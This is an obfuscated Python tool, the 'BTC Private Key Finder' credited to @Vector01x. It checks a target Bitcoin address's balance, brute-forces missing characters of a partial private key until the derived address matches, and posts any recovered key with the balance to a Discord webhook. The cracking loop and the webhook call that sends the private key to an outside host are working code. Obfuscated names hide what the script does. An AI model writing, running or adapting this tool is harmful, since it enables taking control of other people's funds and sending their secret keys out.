"""
pip install requests
pip install bitcoin
pip install colorama
"""


I=enumerate
D=Exception
E=input
C=True
B=print
import re,itertools as J,requests as G
from bitcoin import privkey_to_pubkey as K,pubkey_to_address as L
from colorama import init,Fore as A,Style as F
import time
init(autoreset=C)
""" @Vector01x - BTC Private Key Finder.- V1"""
M=f"""
{A.YELLOW}       
                 .##@@&&&@@##.
              ,##@&::%&&%%::&@##.
             #@&:%%000000000%%:&@#
           #@&:%00'         '00%:&@#
          #@&:%0'             '0%:&@#
         #@&:%0  {A.GREEN}BY @Vector01x{A.YELLOW}   0%:&@#
        #@&:%0                   0%:&@#
        #@&:%0                   0%:&@# 
        \"\" ' \"                   {A.CYAN}\" ' \"\"
      {A.YELLOW}  _{A.RED}oOoOoOo{A.YELLOW}_               {A.GREEN}   .-.-.
     {A.YELLOW}  ({A.MAGENTA}oOoOoOoOo{A.YELLOW})              {A.GREEN}  (  :  )
     {A.YELLOW}   )`\"\"'\"\"`(               {A.GREEN} .-.`. .'.-.
    {A.YELLOW}   /         \\              {A.GREEN}(_  '.Y.'  _)
    {A.YELLOW}  | #         |             {A.GREEN}(   .'|'.   )
    {A.YELLOW}  \\           /             {A.GREEN} '-'  |  '-'  
    {A.YELLOW}   `=========`
  
"""
H='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
def N(OO0O0O000OO0OOO00):
	try:A=K(OO0O0O000OO0OOO00);B=L(A);return B
	except D:return
def O(OOOO000O0O00O00OO):A=OOOO000O0O00O00OO;A=A.strip();B='^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,39}$';return bool(re.match(B,A))
def P(OOOOOO00000O000OO):
	try:
		E=f"https://blockchain.info/q/addressbalance/{OOOOOO00000O000OO}";C=G.get(E)
		if C.status_code==200:F=int(C.text);H=F/1e8;return H
		else:B(A.RED+'Error fetching balance from the API.');return
	except D as I:B(A.RED+f"An error occurred: {I}");return
def Q(OO0O00OO0OO0OO0OO):B=OO0O00OO0OO0OO0OO.count('?');C=len(H)**B;A=C/1000000;D=A//60;E=A%60;return D,E
def R(O00OO0OOO0OO0O0OO,OOO0O0OO0O000O00O):
	E=O00OO0OOO0OO0O0OO;D=[A for(A,B)in I(E)if B=='?']
	for G in J.product(H,repeat=len(D)):
		C=list(E)
		for(K,L)in zip(D,G):C[K]=L
		M=''.join(f"{A.YELLOW}{B}{F.RESET_ALL}"if C in D else B for(C,B)in I(C));B(f"Checking: > {M} <");C=''.join(C);O=N(C)
		if O==OOO0O0OO0O000O00O:B(A.MAGENTA+'****************');B(f"{A.GREEN}Private key found: {C}{F.RESET_ALL}");return C
	B(A.RED+'No valid private key was found matching the target address.')
def S(OOOOO00O0OOO000OO,OO0OOOO000O0OO00O,OOOO00OOOOO0OO0OO):
	F='inline';E='value';D='name';I='DISCORD WEBHOOKS';J={'embeds':[{'title':'Private Key Found!','color':16711680,'fields':[{D:'Balance',E:f"{OOOOO00O0OOO000OO} BTC",F:C},{D:'Private Key',E:f"```{OO0OOOO000O0OO00O}```",F:C},{D:'Target Address',E:f"```{OOOO00OOOOO0OO0OO}```",F:C}],'thumbnail':{'url':'https://avatars.githubusercontent.com/u/113202091?s=400&u=d3333fcc5b3649ed1ad8dc2cd49651b03b5720b8&v=4'}}]};H=G.post(I,json=J) 
	if H.status_code==204:B(A.GREEN+'Message sent to Discord successfully!')
	else:B(A.RED+f"Failed to send message to Discord: {H.status_code}")
def T():
	B(M);B(A.CYAN+'Welcome to the Bitcoin Private Key Finder!')
	while C:
		D=E('Please enter the target Bitcoin address: ').strip()
		if not O(D):B(A.RED+'Invalid Bitcoin address format. Please try again.');continue
		F=P(D)
		if F is not None:B(A.GREEN+f"The current balance of the address is: {F} BTC")
		G=E("Please enter the partial private key (use '?' for missing characters): ").strip();I,J=Q(G);B(A.BLUE+f"Estimated search time: {I} minutes and {J} seconds.");K=E(A.CYAN+'Do you agree to proceed? (y/n): ').strip().lower()
		if K=='n':B(A.YELLOW+'Exiting the tool. Goodbye!');break
		H=R(G,D)
		if H:S(F,H,D)
if __name__=='__main__':T()